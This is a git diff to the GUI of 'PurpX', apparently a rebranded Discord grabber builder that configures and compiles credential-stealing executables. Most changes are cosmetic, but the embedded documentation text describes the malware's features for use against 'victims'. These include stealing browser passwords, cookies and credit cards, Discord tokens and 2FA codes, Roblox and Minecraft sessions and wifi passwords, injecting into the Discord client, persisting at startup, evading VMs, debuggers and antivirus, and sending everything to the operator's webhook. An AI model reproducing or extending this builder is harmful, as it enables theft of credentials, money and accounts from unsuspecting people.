@@ -17,7 +17,7 @@ from PIL import Image
 
 logging.basicConfig(
     level=logging.DEBUG,
-    filename='purpx.log',
+    filename='purp.log',
     filemode='a',
     format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
 )
@@ -29,7 +29,7 @@ class App(customtkinter.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("PurpX Logger Builder")
+        self.title("PurpX Grabber Builder")
         self.geometry("1000x550")
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
@@ -59,9 +59,9 @@ class App(customtkinter.CTk):
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
         self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
-        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "PurpX.png")), size=(60, 60))
-        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "PurpX.png")), size=(500, 150))
-        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "PurpX.png")), size=(20, 20))
+        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "PurpX.jpg")), size=(60, 60))
+        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "PurpX.jpg")), size=(500, 150))
+        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "PurpX.jpg")), size=(20, 20))
         self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
         self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
         self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
@@ -101,7 +101,7 @@ class App(customtkinter.CTk):
                                                            fg_color="#5d11c3", hover_color="#5057eb", font=customtkinter.CTkFont(size=15, family=self.font))
         self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)
 
-        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Builder Options", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
+        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="PurpX Options", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
         self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)
 
         self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
@@ -113,7 +113,7 @@ class App(customtkinter.CTk):
         self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=160)
 
         self.pingtype = customtkinter.CTkOptionMenu(
-            self.builder_frame, width=20, values=["Everyone", "Here"],
+            self.builder_frame, width=20, values=["@Everyone", "@Here"],
             font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
         self.pingtype.set(value="Here")
@@ -242,7 +242,7 @@ class App(customtkinter.CTk):
         self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
         self.docsbox.insert(
             "0.0",
-            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Smaller file size, basically fully undetectable\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")
+            "(Made by Sac8#0 Kill the skids lmfao)\n \nAdd To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Smaller file size, basically fully undetectable\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")
 
         self.select_frame_by_name("home")
 
@@ -429,7 +429,7 @@ class App(customtkinter.CTk):
 
     def get_config(self):
         try:
-            with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
+            with open(self.basefilepath + "\\purp.py", 'r', encoding="utf-8") as f:
                 code = f.read()
 
             config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
@@ -437,7 +437,7 @@ class App(customtkinter.CTk):
             if config_match:
                 config = config_match.group(0)
             else:
-                raise Exception("Could not find config in luna.py")
+                raise Exception("Could not find config in purp.py")
 
             copy_dict = copy.deepcopy(self.updated_dictionary)
             config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
